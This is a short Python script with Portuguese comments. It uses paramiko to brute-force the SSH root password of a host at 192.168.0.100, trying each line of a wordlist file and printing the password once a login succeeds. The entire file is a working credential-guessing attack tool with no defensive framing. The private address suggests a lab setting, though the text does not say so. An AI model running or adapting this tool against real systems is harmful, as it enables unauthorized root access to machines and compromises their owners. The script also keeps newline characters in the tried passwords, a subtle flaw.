#!/usr/bin/python

import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Adiciona a chave automaticamente ao known_hosts.

f = open("lista.txt")
for line in f.readlines():
	try:
		ssh.connect("192.168.0.100", username="root", password="%s" %line)

	except paramiko.AuthenticationException: # Exceção para usuário incorreto.
		print "Acesso Negado", line

	else:
		print "[+] Senha encontrada:", line
		break

ssh.close()
